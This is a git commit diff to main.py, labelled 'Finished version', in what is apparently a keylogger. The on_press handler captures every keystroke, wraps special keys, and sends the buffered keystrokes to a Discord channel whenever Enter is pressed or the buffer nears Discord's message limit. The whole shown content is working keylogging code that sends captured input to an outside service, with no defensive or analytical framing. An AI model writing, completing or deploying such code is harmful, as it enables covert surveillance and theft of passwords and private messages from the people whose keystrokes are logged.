b324dc9af12aaf8a8bbc0455a0ac8c0123274d19
mategol <44233157+mategol@users.noreply.github.com>
2022-06-23 12:37:25 +0200

    Finished version

--- main.py
+++ main.py
@@ -11,12 +11,12 @@ def send_message(message):
 def on_press(key):     # Executes on each key pressed
     global keys_buffer
     if str(key)[:4] == 'Key.':     # Check if pressed key is not number, letter or character
-        key = '[' + str(key) + ']'
+        key = ' `[' + str(key) + ']`'
     else:
         key = str(key)[1]
-    if len(keys_buffer) + len(key) >= 2000 or key == '[Key.enter]':     # Check if keys_buffer exceeds Discord's 2000 characters per message limit or ENTER is pressed
-        send_message(keys_buffer)     # Send logged keys on Discord channel
-        keys_buffer = key     # Reset keys_buffer to log new key presses
+    if len(keys_buffer) + len(key) >= 1975 or key == ' `[Key.enter]`':     # Check if keys_buffer exceeds Discord's 2000 characters per message limit or ENTER is pressed
+        send_message(keys_buffer + key)     # Send logged keys on Discord channel
+        keys_buffer = ''     # Reset keys_buffer to log new key presses
     else:
         keys_buffer += key     # Concatenate new logged key presses to make it look simpler
 
